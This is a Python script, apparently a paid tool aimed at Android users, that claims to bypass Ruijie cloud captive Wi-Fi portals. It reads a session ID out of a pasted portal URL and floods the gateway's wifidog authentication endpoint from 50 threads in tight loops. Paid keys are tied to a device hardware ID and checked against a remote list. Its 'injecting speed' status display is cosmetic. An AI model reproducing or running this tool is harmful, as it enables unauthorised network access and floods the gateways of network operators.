import requests
import re
import urllib3
import time
import threading
import hashlib
import subprocess
import os
import sys
from datetime import datetime
from urllib.parse import urlparse, parse_qs

urllib3.disable_warnings()
os.environ['PYTHONWARNINGS'] = 'ignore'

# ==========================================
# CONFIG & DATABASE
# ==========================================
GIST_RAW_URL = "https://raw.githubusercontent.com/Zyan091/my-database/refs/heads/main/key.txt"
KEY_FILE = os.path.join(os.path.expanduser("~"), ".alli_key.txt")
THREADS = 50 # Gaming အတွက် အကောင်းဆုံး thread

# COLORS
W = "\033[97m"   # White
P = "\033[95m"   # Pink
O = "\033[38;5;214m" # Orange
G = "\033[92m"   # Green
R = "\033[91m"   # Red
C = "\033[96m"   # Cyan
BOLD, RESET = "\033[1m", "\033[0m"

def get_hwid():
    """Redmi 8 HWID"""
    try:
        model = subprocess.check_output("getprop ro.product.model", shell=True).decode().strip()
        serial = subprocess.check_output("getprop ro.serialno", shell=True).decode().strip()
        return hashlib.sha256(f"{model}{serial}ZYAN-PRO".encode()).hexdigest()[:14].upper()
    except: return "ALLI-DEV-ERR"

def verify_license(user_key, current_hwid):
    """Key & Expiry စစ်ဆေးခြင်း"""
    try:
        response = requests.get(f"{GIST_RAW_URL}?nocache={time.time()}", timeout=10, verify=False)
        for line in response.text.splitlines():
            if "|" not in line: continue
            k, stored_hwid, expiry_str, status = line.split('|')
            if user_key == k:
                exp_date = datetime.strptime(expiry_str, "%Y-%m-%d %H:%M:%S")
                diff = exp_date - datetime.now()
                if diff.total_seconds() <= 0: return {"v": False, "m": "EXPIRED"}
                if stored_hwid == "None" or stored_hwid == current_hwid:
                    time_left = f"{diff.days}D {diff.seconds // 3600}H {(diff.seconds // 60) % 60}M"
                    return {"v": True, "m": time_left, "key": k, "exp": expiry_str}
        return {"v": False, "m": "INVALID KEY"}
    except: return {"v": False, "m": "OFFLINE"}

def turbo_ping(auth_link):
    """မူရင်း Engine Logic (MLBB ငြိမ်စေရန်)"""
    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; Redmi 8)',
        'X-Requested-With': 'com.android.settings',
        'Connection': 'keep-alive'
    }
    with requests.Session() as s:
        while True:
            try: s.get(auth_link, headers=headers, timeout=5, verify=False)
            except: pass
            time.sleep(0.001)

def banner():
    subprocess.run("clear", shell=True)
    # Alli အလိုရှိသော အဖြူနှင့် ပန်းရောင်စပ်
    print(f"{P}{BOLD}    █████╗ ██╗     ██╗     ██╗")
    print(f"   ██╔══██╗██║     ██║     ██║")
    print(f"{W}   ███████║██║     ██║     ██║")
    print(f"   ██╔══██║██║     ██║     ██║")
    print(f"{P}   ██║  ██║███████╗███████╗██║")
    print(f"   ╚═╝  ╚═╝╚══════╝╚══════╝╚═╝{RESET}")
    print(f"{O}      ALLI PREMIUM | RUIJIE CLOUD VIP{RESET}")
    print(f"{W}  ------------------------------------------{RESET}")

def start():
    banner()
    hwid = get_hwid()
    print(f"{P}[-] DEVICE ID : {W}{hwid}{RESET}")
    
    key = None
    if os.path.exists(KEY_FILE):
        with open(KEY_FILE, "r") as f: key = f.read().strip()
        auth = verify_license(key, hwid)
        if not auth["v"]: key = None

    if not key:
        key = input(f"{O}[>] ENTER KEY : {W}").strip()
        auth = verify_license(key, hwid)
        if not auth["v"]: print(f"{R}[X] {auth['m']}{RESET}"); sys.exit()

    with open(KEY_FILE, "w") as f: f.write(key)
    
    print(f"\n{O}[*] Please paste your Portal URL below:{RESET}")
    portal_url = input(f"{O}[>] URL: {W}").strip()
    
    try:
        parsed = urlparse(portal_url)
        params = parse_qs(parsed.query)
        sid = params.get('sessionId', [None])[0]
        gw_addr = params.get('gw_address', ["192.168.110.1"])[0]
        gw_port = params.get('gw_port', ['2060'])[0]

        if not sid:
            print(f"{R}[!] Session ID not found in Link!{RESET}"); return

        auth_link = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}"
        
        banner()
        print(f"{G}[✓] BYPASS ACTIVE!{RESET}")
        print(f"{W}  ------------------------------------------")
        print(f"{P}[+] KEY     : {W}{auth['key']}")
        print(f"{P}[+] EXPIRY  : {W}{auth['exp']}")
        print(f"{P}[+] REMAIN  : {O}{BOLD}{auth['m']}{RESET}")
        print(f"{W}  ------------------------------------------")

        for _ in range(THREADS):
            threading.Thread(target=turbo_ping, args=(auth_link,), daemon=True).start()

        # ရောင်စုံ မှိတ်တုတ်မှိတ်တုတ် Animation
        colors = [P, W, O, G, C]
        i = 0
        while True:
            color = colors[i % len(colors)]
            sys.stdout.write(f"\r{color}{BOLD} [⚡] ALLI PRO INJECTING SPEED... STATUS: ULTRA STABLE {RESET}")
            sys.stdout.flush()
            i += 1
            time.sleep(0.3)

    except Exception as e:
        print(f"{R}[!] Error: {e}{RESET}")

if __name__ == "__main__":
    try: start()
    except KeyboardInterrupt: sys.exit()        
